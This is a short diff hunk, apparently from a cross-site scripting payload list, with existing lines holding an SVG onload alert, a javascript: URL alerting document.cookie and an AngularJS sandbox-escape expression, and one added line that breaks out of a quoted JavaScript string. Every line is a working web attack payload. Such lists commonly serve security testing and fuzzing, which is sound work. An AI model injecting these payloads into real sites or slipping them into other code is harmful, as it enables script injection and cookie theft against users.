@@ -4,3 +4,4 @@
 <svg+onload%3dalert(1)>
 javascript:alert(document.cookie)
 {{$on.constructor('alert(1)')()}}
+\"-alert(1)}//
